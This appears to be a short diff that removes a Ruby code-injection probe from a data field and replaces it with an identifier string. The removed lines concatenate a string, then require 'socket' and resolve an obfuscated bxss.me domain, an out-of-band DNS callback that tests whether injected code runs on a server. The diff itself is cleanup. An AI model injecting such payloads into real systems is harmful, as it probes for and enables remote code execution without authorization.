@@ -1,2 +1,1 @@
-'A'.concat(70-3).concat(22*4).concat(119).concat(76).concat(100).concat(79)+(require'socket'
-Socket.gethostbyname('hitkw'+'nzhbjlvfef3dd.bxss.me.')[3].to_s)
+MO_469343973171_005/.
